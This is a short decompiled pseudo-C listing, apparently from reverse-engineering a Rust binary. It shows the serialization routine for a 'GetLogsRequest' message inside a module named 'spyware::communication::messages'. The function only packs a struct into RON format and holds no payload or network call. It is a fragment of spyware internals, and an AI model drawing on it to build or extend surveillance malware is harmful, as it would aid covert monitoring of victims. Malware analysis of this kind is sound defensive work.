
  int32_t* spyware::communication::messages::_::_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..GetLogsRequest$GT$::serialize::he6158cb9ea855423(int32_t* arg1, int64_t arg2, int64_t* arg3)

{
    int32_t var_38;
    _$LT$$RF$mut$u20$ron..ser..Serializer$LT$W$GT$$u20$as$u20$serde..ser..Serializer$GT$::serialize_struct::h19528d03ac3c512b(&var_38, arg3, "GetLogsRequestGetLogsResponseGet…", 0xe, 0);
    int32_t rax = var_38;
    int64_t* var_30;
    char var_28;
    
    if (rax == 0x21)
    {
        _$LT$ron..ser..Compound$LT$W$GT$$u20$as$u20$serde..ser..SerializeStruct$GT$::end::h1114ba35daa4ac40(arg1, var_30, var_28);
        return arg1;
    }
    
    int128_t var_18;
    *(arg1 + 0x20) = var_18;
    int128_t var_27;
    *(arg1 + 0x11) = var_27;
    *arg1 = rax;
    int32_t var_34;
    arg1[1] = var_34;
    *(arg1 + 8) = var_30;
    arg1[4] = var_28;
    return arg1;
}
